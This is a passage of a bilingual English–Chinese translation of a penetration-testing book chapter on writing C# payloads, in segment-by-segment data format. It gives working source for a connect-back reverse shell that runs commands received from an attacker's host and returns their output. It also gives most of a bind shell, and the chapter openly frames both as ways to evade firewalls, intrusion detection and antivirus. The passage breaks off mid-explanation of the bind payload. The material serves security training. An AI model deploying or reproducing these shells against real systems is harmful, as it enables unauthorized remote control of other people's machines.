- en: '4'
  id: totrans-0
  prefs: []
  type: TYPE_NORMAL
  zh: '4'
- en: WRITING CONNECT-BACK, BINDING, AND METASPLOIT PAYLOADS
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 编写连接回传、绑定和Metasploit有效载荷
- en: '![](images/00010.jpg)'
  id: totrans-2
  prefs: []
  type: TYPE_IMG
  zh: '![](images/00010.jpg)'
- en: As a penetration tester or a security engineer, it’s really useful to be able
    to write and customize payloads on the fly. Often, corporate environments will
    differ drastically from one to the next, and “off-the-shelf” payloads by frameworks
    such as Metasploit are simply blocked by intrusion detection/prevention systems,
    network access controls, or other variables of the network. However, Windows machines
    on corporate networks almost always have the .NET framework installed, which makes
    C# a great language to write payloads in. The core libraries available to C# also
    have excellent networking classes that allow you to hit the ground running in
    any environment.
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 作为渗透测试人员或安全工程师，能够即时编写和定制有效载荷是非常有用的。企业环境之间往往差异很大，而像Metasploit这样的框架提供的“现成”有效载荷通常会被入侵检测/防御系统、网络访问控制或网络的其他变量阻止。然而，企业网络中的Windows机器几乎总是安装了.NET框架，这使得C#成为编写有效载荷的绝佳语言。C#提供的核心库也具有出色的网络类，可以让你在任何环境中迅速开始工作。
- en: The best penetration testers know how to build custom payloads, tailored for
    particular environments, in order to stay under the radar longer, maintain persistence,
    or bypass an intrusion detection system or firewall. This chapter shows you how
    to write an assortment of payloads for use over TCP (Transmission Control Protocol)
    and UDP (User Datagram Protocol). We’ll create a cross-platform UDP connect-back
    payload to bypass weak firewall rules and discuss how to run arbitrary Metasploit
    assembly payloads to aid in antivirus evasion.
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
  zh: 最优秀的渗透测试人员知道如何构建定制化的有效载荷，针对特定的环境量身打造，以便能够在不被察觉的情况下维持较长时间的隐匿、保持持久性，或者绕过入侵检测系统或防火墙。本章将向你展示如何编写用于TCP（传输控制协议）和UDP（用户数据报协议）的多种有效载荷。我们将创建一个跨平台的UDP连接回传有效载荷，以绕过较弱的防火墙规则，并讨论如何运行任意的Metasploit汇编有效载荷以帮助避开杀毒软件的检测。
- en: Creating a Connect-Back Payload
  id: totrans-5
  prefs: []
  type: TYPE_NORMAL
  zh: 创建连接回传有效载荷
- en: The first kind of payload we’ll write is a connect-back, which allows an attacker
    to listen for a connection back from the target. This type of payload is useful
    if you don’t have direct access to the machine that the payload is being run on.
    For example, if you are outside the network performing a phishing campaign with
    Metasploit Pro, this type of payload allows the targets to reach outside the network
    to connect with you. The alternative, which we’ll discuss shortly, is for the
    payload to listen for a connection from the attacker on the target’s machine.
    Binding payloads like these are most useful for maintaining persistence when you
    can get network access.
  id: totrans-6
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将编写的第一种有效载荷是连接回传，这允许攻击者监听目标设备的回传连接。如果你无法直接访问运行有效载荷的机器，这种类型的有效载荷非常有用。例如，如果你在外部网络执行带有Metasploit
    Pro的钓鱼活动，这种有效载荷允许目标设备通过外部网络与你建立连接。另一种方式，我们稍后会讨论，是让有效载荷在目标机器上监听来自攻击者的连接。像这样的绑定有效载荷在你能够获得网络访问权限时，最有助于维持持久性。
- en: The Network Stream
  id: totrans-7
  prefs: []
  type: TYPE_NORMAL
  zh: 网络流
- en: We’ll use the netcat utility available on most Unix-like operating systems to
    test our bind and connect-back payloads. Most Unix operating systems come with
    netcat preinstalled, but if you want to use it on Windows, you must download the
    utility with Cygwin or as an independent binary (or build from source!). First,
    set up netcat to listen for the connection back from our target, as shown in [Listing
    4-1](#filepos347775).
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将使用大多数Unix类操作系统上可用的netcat工具来测试我们的绑定和连接回传有效载荷。大多数Unix操作系统都预装了netcat，但如果你想在Windows上使用它，则必须通过Cygwin或独立的二进制文件下载该工具（或从源代码构建！）。首先，设置netcat来监听从我们的目标设备发出的连接回传，如[示例
    4-1](#filepos347775)所示。
- en: $ nc -l 4444
  id: totrans-9
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: $ nc -l 4444
- en: 'Listing 4-1: Listening on port 4444 using netcat'
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: '示例 4-1: 使用netcat在端口4444上监听'
- en: Our connect-back payload needs to create a network stream to read from and write
    to. As you can see in [Listing 4-2](#filepos348756), the first lines of the payload’s
    Main() method create this stream for later use based on arguments passed to the
    payload.
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
  zh: 我们的连接回传有效载荷需要创建一个网络流来进行读写。如[示例 4-2](#filepos348756)所示，有效载荷的Main()方法的前几行创建了这个网络流，并在后续使用时根据传递给有效载荷的参数来设置。
- en: public static void Main(string[] args)
  id: totrans-12
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: public static void Main(string[] args)
- en: '{'
  id: totrans-13
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: using (TcpClient client = new ➊TcpClient(args[0], ➋int.Parse(args[1])))
  id: totrans-14
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 使用 (TcpClient client = new ➊TcpClient(args[0], ➋int.Parse(args[1])))
- en: '{'
  id: totrans-15
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: using (Stream stream = client.➌GetStream())
  id: totrans-16
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 使用 (Stream stream = client.➌GetStream())
- en: '{'
  id: totrans-17
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: using (StreamReader rdr = new ➍StreamReader(stream))
  id: totrans-18
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 使用 (StreamReader rdr = new ➍StreamReader(stream))
- en: '{'
  id: totrans-19
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: 'Listing 4-2: Creating the stream back to the attacker using payload arguments'
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: 清单 4-2：使用有效载荷参数创建回攻攻击者的流
- en: 'The TcpClient class constructor takes two arguments: the host to connect to
    as a string and the port to connect to on the host as an int. Using the arguments
    passed to the payload, and assuming the first argument is the host to connect
    to, we pass the arguments to the TcpClient constructor ➊. Since by default the
    arguments are strings, we don’t need to cast the host to any special type, only
    the port.'
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: TcpClient 类构造函数接受两个参数：要连接的主机的字符串和要连接的端口号的 int 类型。使用传递给有效载荷的参数，假设第一个参数是要连接的主机，我们将这些参数传递给
    TcpClient 构造函数 ➊。由于默认情况下这些参数是字符串，我们不需要将主机强制转换为任何特殊类型，只需要转换端口。
- en: The second argument, which specifies the port to connect to, must be given as
    an int. In order to achieve this, we use the int.Parse() static method ➋ to convert
    the second argument from a string to an int. (Many types in C# have a static Parse()
    method that converts one type to another.) After instantiating the TcpClient,
    we call the client’s GetStream() method ➌ and assign it to the variable stream,
    which we’ll read from and write to. Finally, we pass the stream to a StreamReader
    class constructor ➍ so that we can easily read the commands coming from the attacker.
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: 第二个参数，指定要连接的端口，必须以 int 类型提供。为了实现这一点，我们使用 int.Parse() 静态方法 ➋ 将第二个参数从字符串转换为 int。（C#
    中许多类型都有静态 Parse() 方法，将一种类型转换为另一种类型。）在实例化 TcpClient 后，我们调用客户端的 GetStream() 方法 ➌
    并将其赋值给变量 stream，供我们读取和写入。最后，我们将流传递给 StreamReader 类构造函数 ➍，以便可以轻松读取来自攻击者的命令。
- en: Next, we need the payload to read from the stream as long as we are sending
    commands from our netcat listener. For this we’ll use the stream created in [Listing
    4-2](#filepos348756), as shown in [Listing 4-3](#filepos351334).
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们需要让有效载荷从流中读取数据，只要我们从 netcat 监听器发送命令。为此，我们将使用在[清单 4-2](#filepos348756)中创建的流，如[清单
    4-3](#filepos351334)所示。
- en: while (true)
  id: totrans-24
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: while (true)
- en: '{'
  id: totrans-25
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: string cmd = rdr.➊ReadLine();
  id: totrans-26
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string cmd = rdr.➊ReadLine();
- en: ''
  id: totrans-27
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: if (string.IsNullOrEmpty(cmd))
  id: totrans-28
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: if (string.IsNullOrEmpty(cmd))
- en: '{'
  id: totrans-29
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: rdr.➋Close();
  id: totrans-30
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: rdr.➋Close();
- en: stream.Close();
  id: totrans-31
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: stream.Close();
- en: client.Close();
  id: totrans-32
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: client.Close();
- en: return;
  id: totrans-33
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: return;
- en: '}'
  id: totrans-34
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: ''
  id: totrans-35
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: if (string.➌IsNullOrWhiteSpace(cmd))
  id: totrans-36
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: if (string.➌IsNullOrWhiteSpace(cmd))
- en: continue;
  id: totrans-37
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: continue;
- en: ''
  id: totrans-38
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: string[] split = cmd.Trim().➍Split(' ');
  id: totrans-39
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string[] split = cmd.Trim().➍Split(' ');
- en: string filename = split.➎First();
  id: totrans-40
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string filename = split.➎First();
- en: 'string arg = string.➏Join(" ", split.➐Skip(1)); Listing 4-3: Reading the command
    from the stream and parsing the command from the command arguments'
  id: totrans-41
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string arg = string.➏Join(" ", split.➐Skip(1)); 清单 4-3：从流中读取命令并解析命令及其参数
- en: Within an infinite while loop, the StreamReader ReadLine() method ➊ reads a
    line of data from the stream, which is then assigned to the cmd variable. We determine
    what a line of data is based on where a newline character appears in the data
    stream (\n, or 0x0a in hexadecimal). If the string returned by ReadLine() is empty
    or null, we close ➋ the stream reader, the stream, and the client, and then return
    from the program. If the string contains only whitespace ➌, we start the loop
    over using continue, which brings us back to the ReadLine() method to start over.
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: 在一个无限的 while 循环中，StreamReader 的 ReadLine() 方法 ➊ 从流中读取一行数据，然后将其赋值给 cmd 变量。我们根据数据流中出现换行符的位置（\n，或十六进制表示为
    0x0a）来判断一行数据的结束。如果 ReadLine() 返回的字符串为空或为 null，我们关闭 ➋ 流读取器、流和客户端，然后从程序中返回。如果字符串仅包含空白字符
    ➌，我们通过使用 continue 重新开始循环，这将使我们回到 ReadLine() 方法，从头开始。
- en: After reading the command to be run from the network stream, we separate the
    arguments to the command from the command itself. For example, if an attacker
    sends the command ls -a, the command is ls, and the argument to the command is
    -a.
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: 在从网络流中读取到要执行的命令后，我们将命令本身与命令的参数分开。例如，如果攻击者发送命令 `ls -a`，命令是 `ls`，命令的参数是 `-a`。
- en: To separate out the arguments, we use the Split() method ➍ to split the full
    command on every space in the string and then return an array of strings. The
    string array is a result of splitting the whole command string by the delimiter
    passed as the argument to the Split() method, which in our case is a space. Next,
    we use the First() method ➎, which is available in the System.Linq namespace for
    enumerable types such as arrays, to select the first element in the string array
    returned by the split, and we assign it to the string filename to hold our base
    command. This should be the actual command name. Then, the Join() method ➏ joins
    all but the first string in the split array with a space as the joining character.
    We also use the LINQ method Skip() ➐ to skip the first element in the array that
    was stored in the filename variable. The resulting string should contain all arguments
    passed to the command. This new string is assigned to the string arg.
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: 为了分离出参数，我们使用 Split() 方法 ➍ 将完整命令按每个空格分割成字符串，然后返回一个字符串数组。字符串数组是通过将整个命令字符串按照传递给
    Split() 方法的分隔符（在我们这里是空格）进行分割得到的结果。接着，我们使用 First() 方法 ➎，该方法可用于如数组等可枚举类型，它从 Split
    返回的字符串数组中选择第一个元素，并将其赋值给字符串变量 filename，用于保存基本命令。这应该是实际的命令名称。然后，Join() 方法 ➏ 会将分割数组中的所有元素（除了第一个）通过空格连接成一个字符串。我们还使用
    LINQ 的 Skip() 方法 ➐ 来跳过存储在 filename 变量中的数组中的第一个元素。最终的字符串应该包含传递给命令的所有参数。这个新的字符串被赋值给字符串变量
    arg。
- en: Running the Command
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: 运行命令
- en: Now we need to run the command and return the output to the attacker. As shown
    in [Listing 4-4](#filepos355535), we use the Process and ProcessStartInfo classes
    to set up and run the command and then write the output back to the attacker.
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们需要运行命令并将输出返回给攻击者。如[示例 4-4](#filepos355535)所示，我们使用 Process 和 ProcessStartInfo
    类来设置并运行命令，然后将输出写回给攻击者。
- en: try
  id: totrans-47
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: try
- en: '{'
  id: totrans-48
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: Process prc = new ➊Process();
  id: totrans-49
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Process prc = new ➊Process();
- en: prc.➋StartInfo = new ProcessStartInfo();
  id: totrans-50
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: prc.➋StartInfo = new ProcessStartInfo();
- en: prc.StartInfo.➌FileName = filename;
  id: totrans-51
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: prc.StartInfo.➌FileName = filename;
- en: prc.StartInfo.➍Arguments = arg;
  id: totrans-52
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: prc.StartInfo.➍Arguments = arg;
- en: prc.StartInfo.➎UseShellExecute = false;
  id: totrans-53
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: prc.StartInfo.➎UseShellExecute = false;
- en: prc.StartInfo.➏RedirectStandardOutput = true;
  id: totrans-54
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: prc.StartInfo.➏RedirectStandardOutput = true;
- en: prc.➐Start();
  id: totrans-55
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: prc.➐Start();
- en: prc.StandardOutput.BaseStream.➑CopyTo(stream);
  id: totrans-56
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: prc.StandardOutput.BaseStream.➑CopyTo(stream);
- en: prc.WaitForExit();
  id: totrans-57
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: prc.WaitForExit();
- en: '}'
  id: totrans-58
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: catch
  id: totrans-59
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: catch
- en: '{'
  id: totrans-60
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: string error = "Error running command " + cmd + "\n";
  id: totrans-61
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string error = "执行命令时出错 " + cmd + "\n";
- en: byte[] errorBytes = ➒Encoding.ASCII.GetBytes(error);
  id: totrans-62
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: byte[] errorBytes = ➒Encoding.ASCII.GetBytes(error);
- en: stream.➓Write(errorBytes, 0, errorBytes.Length);
  id: totrans-63
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: stream.➓Write(errorBytes, 0, errorBytes.Length);
- en: '}'
  id: totrans-64
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-65
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-66
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-67
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-68
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: '}'
  id: totrans-69
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: 'Listing 4-4: Running the attacker-supplied command to the connect-back payload
    and returning the output'
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: '示例 4-4: 运行攻击者提供的命令并返回连接回负载的输出'
- en: 'After instantiating a new Process class ➊, we assign a new ProcessStartInfo
    class to the StartInfo property ➋ of the Process class, which allows us to define
    certain options for the command so that we can get the output. Having assigned
    the StartInfo property with a new ProcessStartInfo class, we then assign values
    to the StartInfo properties: the FileName property ➌, which is the command we
    want to run, and the Arguments property ➍, which contains any arguments for the
    command.'
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 在实例化一个新的 Process 类 ➊ 后，我们将一个新的 ProcessStartInfo 类分配给 Process 类的 StartInfo 属性
    ➋，这使我们可以为命令定义某些选项，从而获取输出。在将 StartInfo 属性赋值为一个新的 ProcessStartInfo 类后，我们再为 StartInfo
    属性中的各个属性赋值：FileName 属性 ➌，即我们要运行的命令，以及 Arguments 属性 ➍，它包含命令的任何参数。
- en: We also assign the UseShellExecute property ➎ to false and the RedirectStandardOutput
    property ➏ to true. If UseShellExecute were set to true, the command would be
    run in the context of another system shell, rather than directly by the current
    executable. With RedirectStandardOutput set to true, we can use the StandardOutput
    property of the Process class to read the command output.
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还将 UseShellExecute 属性 ➎ 设置为 false，将 RedirectStandardOutput 属性 ➏ 设置为 true。如果
    UseShellExecute 设置为 true，命令将会在另一个系统 shell 中运行，而不是由当前可执行文件直接运行。通过将 RedirectStandardOutput
    设置为 true，我们可以使用 Process 类的 StandardOutput 属性来读取命令的输出。
- en: Once the StartInfo property is set, we call Start() ➐ on the Process to begin
    execution of the command. While the process is running, we copy its standard output
    directly to the network stream to send to the attacker using CopyTo() ➑ on the
    StandardOutput stream’s BaseStream property. If an error occurs during execution,
    Encoding.ASCII.GetBytes() ➒ converts the string Error running command <cmd> to
    a byte array, which is then written to the network stream for the attacker using
    the stream’s Write() method ➓.
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦设置了StartInfo属性，我们调用Process上的Start() ➐开始执行命令。进程运行时，我们将其标准输出直接复制到网络流中，使用CopyTo()
    ➑将数据发送给攻击者。如果在执行过程中发生错误，Encoding.ASCII.GetBytes() ➒将字符串“Error running command
    <cmd>”转换为字节数组，然后使用流的Write()方法 ➓将其写入网络流发送给攻击者。
- en: Running the Payload
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
  zh: 运行有效载荷
- en: Running the payload with 127.0.0.1 and 4444 as the arguments should connect
    back to our netcat listener so that we can run commands on the local machine and
    display them in the terminal, as shown in [Listing 4-5](#filepos358607).
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: 使用127.0.0.1和4444作为参数运行有效载荷应该会连接回我们的netcat监听器，这样我们就可以在本地机器上运行命令，并在终端显示出来，如[清单4-5](#filepos358607)所示。
- en: $ nc -l 4444
  id: totrans-76
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: $ nc -l 4444
- en: whoami
  id: totrans-77
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: whoami
- en: bperry
  id: totrans-78
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: bperry
- en: uname
  id: totrans-79
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: uname
- en: 'Linux Listing 4-5: Connect-back payload connecting to the local listener and
    running commands'
  id: totrans-80
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: Linux 清单4-5：反向连接有效载荷连接到本地监听器并运行命令
- en: Binding a Payload
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: 绑定有效载荷
- en: When you’re on a network with direct access to the machines that could be running
    your payloads, you’ll sometimes want the payloads to wait for you to connect to
    them, rather than you waiting for a connection from them.
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: 当您处于可以直接访问可能运行有效载荷的机器的网络中时，有时您希望有效载荷等待您连接到它们，而不是您等待它们的连接。
- en: In such cases, the payloads should bind locally to a port that you can simply
    connect to with netcat so you can begin interacting with the system’s shell.
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 在这种情况下，有效载荷应该本地绑定到一个端口，您可以简单地使用netcat连接到该端口，以便开始与系统的Shell进行交互。
- en: In the connect-back payload, we used the TcpClient class to create a connection
    to the attacker. Here, instead of using the TcpClient class, we’ll use the TcpListener
    class to listen for a connection from the attacker, as shown in [Listing 4-6](#filepos360328).
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: 在反向连接有效载荷中，我们使用TcpClient类创建与攻击者的连接。这里，我们将使用TcpListener类代替TcpClient类，来监听来自攻击者的连接，如[清单4-6](#filepos360328)所示。
- en: public static void Main(string[] args)
  id: totrans-85
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: public static void Main(string[] args)
- en: '{'
  id: totrans-86
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: int port = ➊int.Parse(args[0]);
  id: totrans-87
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: int port = ➊int.Parse(args[0]);
- en: TcpListener listener = new ➋TcpListener(IPAddress.Any, port);
  id: totrans-88
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: TcpListener listener = new ➋TcpListener(IPAddress.Any, port);
- en: try
  id: totrans-89
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 尝试
- en: '{'
  id: totrans-90
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: listener.➌Start();
  id: totrans-91
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: listener.➌Start();
- en: '}'
  id: totrans-92
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: catch
  id: totrans-93
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 捕获
- en: '{'
  id: totrans-94
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: return;
  id: totrans-95
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 返回;
- en: '}'
  id: totrans-96
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: 'Listing 4-6: Starting a  TcpListener  on a given port via command arguments'
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
  zh: 清单4-6：通过命令参数在给定端口上启动TcpListener
- en: Before we start listening, we convert the argument passed to the payload to
    an integer using int.Parse() ➊, which will be the port to listen on. Then we instantiate
    a new TcpListener class ➋ by passing IPAddress.Any as the first argument to the
    constructor and the port we want to listen on as the second argument. The IPAddress.Any
    value passed as the first argument tells the TcpListener to listen on any available
    interface (0.0.0.0).
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: 在开始监听之前，我们使用int.Parse() ➊将传递给有效载荷的参数转换为整数，这将是监听的端口。然后我们通过将IPAddress.Any作为第一个参数传递给构造函数，并将我们希望监听的端口作为第二个参数，来实例化一个新的TcpListener类
    ➋。传递给第一个参数的IPAddress.Any值告诉TcpListener监听任何可用的接口（0.0.0.0）。
- en: Next, we attempt to begin listening on the port in a try/catch block. We do
    so because calling Start() ➌ could throw an exception if, for example, the payload
    is not running as a privileged user and it attempts to bind to a port number less
    than 1024, or if it attempts to bind to a port already bound to by another program.
    By running Start() in a try/catch block, we can catch this exception and exit
    gracefully if necessary. Of course, if Start() succeeds, the payload will begin
    listening for a new connection on that port.
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们尝试在try/catch块中开始监听端口。我们这样做是因为调用Start() ➌可能会抛出异常，例如，如果有效载荷不是以特权用户身份运行，并且它试图绑定到一个小于1024的端口号，或者它试图绑定到另一个程序已经绑定的端口。通过在try/catch块中运行Start()，我们可以捕获此异常并在必要时优雅地退出。当然，如果Start()成功，载荷将开始在该端口上监听新连接。
- en: Accepting Data, Running Commands, and Returning Output
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: 接受数据、运行命令并返回输出
- en: Now we can begin accepting data from the attacker and parsing the commands,
    as shown in [Listing 4-7](#filepos363520).
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们可以开始接受来自攻击者的数据并解析命令，如[清单4-7](#filepos363520)所示。
- en: ➊while (true)
  id: totrans-102
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: ➊while (true)
- en: '{'
  id: totrans-103
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: using (Socket socket = ➋listener.AcceptSocket())
  id: totrans-104
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 使用 (Socket socket = ➋listener.AcceptSocket())
- en: '{'
  id: totrans-105
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: using (NetworkStream stream = new ➌NetworkStream(socket))
  id: totrans-106
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 使用 (NetworkStream stream = new ➌NetworkStream(socket))
- en: '{'
  id: totrans-107
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: using (StreamReader rdr = new ➍StreamReader(stream))
  id: totrans-108
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 使用 (StreamReader rdr = new ➍StreamReader(stream))
- en: '{'
  id: totrans-109
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: ➎while (true)
  id: totrans-110
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: ➎while (true)
- en: '{'
  id: totrans-111
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: string cmd = rdr.ReadLine();
  id: totrans-112
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string cmd = rdr.ReadLine();
- en: ''
  id: totrans-113
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: if (string.IsNullOrEmpty(cmd))
  id: totrans-114
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 如果 (string.IsNullOrEmpty(cmd))
- en: '{'
  id: totrans-115
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '{'
- en: rdr.Close();
  id: totrans-116
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: rdr.Close();
- en: stream.Close();
  id: totrans-117
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: stream.Close();
- en: listener.Stop();
  id: totrans-118
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: listener.Stop();
- en: break;
  id: totrans-119
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: break;
- en: '}'
  id: totrans-120
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: '}'
- en: ''
  id: totrans-121
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: if (string.IsNullOrWhiteSpace(cmd))
  id: totrans-122
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 如果 (string.IsNullOrWhiteSpace(cmd))
- en: continue;
  id: totrans-123
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: continue;
- en: ''
  id: totrans-124
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
- en: string[] split = cmd.Trim().➏Split(' ');
  id: totrans-125
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string[] split = cmd.Trim().➏Split(' ');
- en: string filename = split.➐First();
  id: totrans-126
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: string filename = split.➐First();
- en: 'string arg = string.➑Join(" ", split.Skip(1)); Listing 4-7: Reading the command
    from the network stream and splitting the command from the arguments'
  id: totrans-127
  prefs:
  - PREF_BQ
  type: TYPE_NORMAL
  zh: 'string arg = string.➑Join(" ", split.Skip(1)); Listing 4-7: 从网络流读取命令并将命令与参数分开'
- en: In order to maintain persistence on the target after we disconnect from the
    payload, we instantiate a new NetworkStream class inside a technically infinite
    while loop ➊ by passing the Socket returned by listener.AcceptSocket() ➋ to the
    NetworkStream constructor ➌. Then, in order to read the NetworkStream efficiently,
    within the context of a using statement, we instantiate a new StreamReader class
    ➍ by passing the network stream to the StreamReader constructor. Once we have
    the StreamReader set up, we use a second infinite while loop ➎ to continue reading
    commands until an empty line is sent to the payload by the attacker.
  id: totrans-128
  prefs: []
  type: TYPE_NORMAL
  zh: 为了在我们与负载断开连接后在目标上保持持久性，我们在技术上是无限的while循环 ➊ 内实例化一个新的NetworkStream类，方法是将listener.AcceptSocket()
    返回的Socket ➋ 传递给NetworkStream构造函数 ➌。然后，为了高效地读取NetworkStream，在using语句的上下文中，我们实例化一个新的StreamReader类
    ➍，并将网络流传递给StreamReader构造函数。一旦我们设置好StreamReader，就使用第二个无限while循环 ➎ 来继续读取命令，直到攻击者发送空行给负载为止。
- en: To parse and execute commands from the stream and return the output to the connecting
    attacker, we declare a series of string variables within the inner while loop
    and split the original input on any spaces in the string ➏. Next, we take the
